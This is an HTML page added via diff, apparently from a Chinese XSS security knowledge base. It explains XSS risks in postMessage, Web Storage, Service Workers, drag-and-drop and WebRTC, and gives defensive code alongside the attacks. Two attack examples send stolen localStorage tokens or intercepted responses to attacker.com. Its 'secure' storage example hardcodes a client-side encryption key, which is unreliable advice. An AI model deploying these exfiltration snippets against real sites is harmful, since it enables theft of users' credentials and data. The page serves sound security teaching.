@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+    <title>HTML5新特性与XSS安全 - XSS安全知识库</title>
+    <meta name="description" content="深入探讨HTML5新特性带来的XSS安全隐患，包括postMessage跨域通信、Web Storage、Web Workers等特性的安全风险与防护。">
+    <meta name="keywords" content="HTML5安全,postMessage XSS,Web Storage XSS,Service Worker攻击,HTML5 XSS,跨域安全">
+    <meta name="author" content="蓝莲花XSS平台">
+    <meta property="og:title" content="HTML5新特性与XSS安全 - XSS安全知识库">
+    <meta property="og:description" content="HTML5新特性安全分析，掌握现代Web应用的XSS攻防技术">
+    <meta property="og:type" content="article">
+    <title>HTML5新特性与XSS安全 - XSS安全知识库</title>
+    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
+    <style>
+        :root { --neon-green: #00ff41; --bg-primary: #0a0e27; --bg-secondary: #151932; --text-primary: #e0e0e0; --text-secondary: #b0b0b0; --border-color: rgba(0, 255, 65, 0.2); --cyan: #00d9ff; --border-radius: 8px; --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-family); line-height: 1.7; }
+        .article-header { background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-primary) 100%); padding: 3rem 0; border-bottom: 2px solid var(--border-color); }
+        .breadcrumb { background: transparent; margin-bottom: 1.5rem; }
+        .breadcrumb-item { color: var(--text-secondary); }
+        .breadcrumb-item a { color: var(--neon-green); text-decoration: none; }
+        .breadcrumb-item.active { color: var(--text-primary); }
+        .article-title { font-size: 2.5rem; font-weight: 700; color: var(--neon-green); margin-bottom: 1rem; }
+        .article-meta { color: var(--text-secondary); font-size: 0.95rem; }
+        .main-content { padding: 3rem 0; }
+        .toc { background: rgba(0, 255, 65, 0.05); border: 1px solid var(--border-color); border-radius: var(--border-radius); padding: 1.5rem; margin-bottom: 2rem; }
+        .toc h3 { color: var(--neon-green); font-size: 1.2rem; margin-bottom: 1rem; }
+        .toc ul { list-style: none; padding-left: 0; }
+        .toc ul li { margin-bottom: 0.5rem; }
+        .toc ul li a { color: var(--text-secondary); text-decoration: none; }
+        .article-content { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--border-radius); padding: 2rem; }
+        .article-content h2 { color: var(--neon-green); font-size: 1.8rem; margin: 2rem 0 1rem 0; border-bottom: 2px solid var(--border-color); }
+        .article-content h3 { color: var(--cyan); font-size: 1.4rem; margin: 1.5rem 0 1rem 0; }
+        .article-content p { color: var(--text-secondary); margin-bottom: 1rem; }
+        .article-content ul { color: var(--text-secondary); margin-bottom: 1rem; padding-left: 2rem; }
+        .article-content strong { color: var(--neon-green); }
+        .code-block { background: #1e1e1e; border: 1px solid var(--border-color); border-radius: var(--border-radius); margin: 1rem 0; overflow-x: auto; }
+        .code-block pre { margin: 0; padding: 1rem; }
+        .warning-box { background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; margin: 1rem 0; border-radius: 4px; }
+        .danger-box { background: rgba(220, 53, 69, 0.1); border-left: 4px solid #dc3545; padding: 1rem; margin: 1rem 0; border-radius: 4px; }
+        .back-to-top { position: fixed; bottom: 40px; right: 40px; width: 50px; height: 50px; background: var(--neon-green); color: #000; border: none; border-radius: 50%; font-size: 1.5rem; cursor: pointer; opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 1000; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3); }
+        .back-to-top:hover { transform: translateY(-5px); box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5); }
+        .back-to-top.show { opacity: 1; visibility: visible; }
+    </style>
+</head>
+<body>
+    <div class="article-header">
+        <div class="container">
+            <nav><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li><li class="breadcrumb-item active">HTML5新特性与XSS安全</li></ol></nav>
+            <h1 class="article-title">HTML5新特性与XSS安全</h1>
+            <div class="article-meta"><span><i class="far fa-calendar"></i> 2025年1月</span><span class="mx-3">|</span><span><i class="far fa-clock"></i> 18分钟阅读</span></div>
+        </div>
+    </div>
+    <div class="main-content">
+        <div class="container">
+            <div class="row"><div class="col-lg-10 offset-lg-1">
+                <div class="toc"><h3><i class="fas fa-list"></i> 目录</h3><ul><li><a href="#postmessage">1. postMessage跨域通信漏洞</a></li><li><a href="#storage">2. Web Storage安全问题</a></li><li><a href="#worker">3. Web Worker与Service Worker攻击</a></li><li><a href="#other">4. 其他HTML5特性安全</a></li></ul></div>
+                <div class="article-content">
+                    <h2 id="postmessage">1. postMessage跨域通信漏洞</h2>
+                    <p>HTML5的postMessage API允许不同源的窗口进行安全通信，但如果未正确验证消息来源，可能导致严重的XSS漏洞。</p>
+                    <div class="warning-box"><h4>不安全的postMessage接收</h4><div class="code-block"><pre><code>// 危险代码：未验证消息来源
+window.addEventListener('message', function(e) {
+    document.getElementById('output').innerHTML = e.data; // XSS!
+});</code></pre></div></div>
+                    <h3>安全的实现方式</h3>
+                    <div class="code-block"><pre><code>// 安全代码：验证来源和内容
+window.addEventListener('message', function(e) {
+    // 1. 验证消息来源
+    if(e.origin !== 'https://trusted-domain.com') {
+        return;
+    }
+    
+    // 2. 验证消息格式
+    if(typeof e.data !== 'object' || !e.data.action) {
+        return;
+    }
+    
+    // 3. 使用textContent而非innerHTML
+    document.getElementById('output').textContent = e.data.message;
+});</code></pre></div>
+
+                    <h2 id="storage">2. Web Storage安全问题</h2>
+                    <p>localStorage和sessionStorage虽然方便，但存在被XSS窃取的风险。</p>
+                    <div class="danger-box"><h4>常见攻击场景</h4><ul><li><strong>Token窃取</strong>：攻击者通过XSS读取localStorage中的JWT令牌</li><li><strong>数据污染</strong>：注入恶意数据到Storage，影响应用逻辑</li><li><strong>持久化后门</strong>：在Storage中植入恶意代码</li></ul></div>
+                    <div class="code-block"><pre><code>// 攻击示例：窃取localStorage数据
+var stolen = {
+    token: localStorage.getItem('auth_token'),
+    user: localStorage.getItem('user_data')
+};
+fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(stolen)
+});</code></pre></div>
+                    <h3>防御措施</h3>
+                    <div class="code-block"><pre><code>// 1. 敏感数据使用HttpOnly Cookie而非localStorage
+// 2. Storage数据加密存储
+function secureStorage() {
+    return {
+        set: function(key, value) {
+            const encrypted = CryptoJS.AES.encrypt(value, 'secret-key');
+            localStorage.setItem(key, encrypted.toString());
+        },
+        get: function(key) {
+            const encrypted = localStorage.getItem(key);
+            if(!encrypted) return null;
+            const decrypted = CryptoJS.AES.decrypt(encrypted, 'secret-key');
+            return decrypted.toString(CryptoJS.enc.Utf8);
+        }
+    };
+}</code></pre></div>
+
+                    <h2 id="worker">3. Web Worker与Service Worker攻击</h2>
+                    <p>Service Worker可以拦截网络请求，如果被XSS注入恶意Worker，可能导致严重后果。</p>
+                    <div class="code-block"><pre><code>// 恶意Service Worker示例
+self.addEventListener('fetch', function(event) {
+    // 拦截所有请求，窃取数据
+    event.respondWith(
+        fetch(event.request).then(function(response) {
+            // 克隆响应并窃取
+            const clonedResponse = response.clone();
+            clonedResponse.text().then(function(data) {
+                fetch('https://attacker.com/steal', {
+                    method: 'POST',
+                    body: data
+                });
+            });
+            return response;
+        })
+    );
+});</code></pre></div>
+
+                    <h2 id="other">4. 其他HTML5特性安全</h2>
+                    <h3>4.1 拖放API (Drag & Drop)</h3>
+                    <div class="code-block"><pre><code>// 拖放XSS攻击
+document.addEventListener('drop', function(e) {
+    e.preventDefault();
+    var html = e.dataTransfer.getData('text/html');
+    document.body.innerHTML += html; // 危险！可能包含XSS
+});</code></pre></div>
+                    <h3>4.2 Canvas指纹追踪</h3>
+                    <p>虽然不是直接的XSS，但可以用于用户追踪和隐私侵犯。</p>
+                    <h3>4.3 WebRTC IP泄露</h3>
+                    <div class="code-block"><pre><code>// 获取用户真实IP地址
+var pc = new RTCPeerConnection({iceServers:[]});
+pc.createDataChannel('');
+pc.createOffer().then(offer => pc.setLocalDescription(offer));
+pc.onicecandidate = function(ice) {
+    if(ice.candidate) {
+        console.log('IP泄露:', ice.candidate.candidate);
+    }
+};</code></pre></div>
+                </div>
+            </div></div>
+        </div>
+    </div>
+    <footer style="background:var(--bg-secondary);padding:2rem 0;margin-top:3rem;border-top:2px solid var(--border-color);text-align:center;color:var(--text-secondary)"><div class="container"><p>&copy; 2025 蓝莲花XSS平台</p></div></footer>
+    <button class="back-to-top" id="backToTop"><i class="fas fa-arrow-up"></i></button>
+    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="../static/libs/prism/js/prism.min.js"></script>
+    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
+    <script src="../static/libs/prism/js/prism-markup.min.js"></script>
+    <script src="../static/libs/prism/js/prism-php.min.js"></script>
+    <script>const b=document.getElementById('backToTop');window.addEventListener('scroll',()=>{b.classList.toggle('show',window.pageYOffset>300)});b.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));</script>
+</body>
+</html>
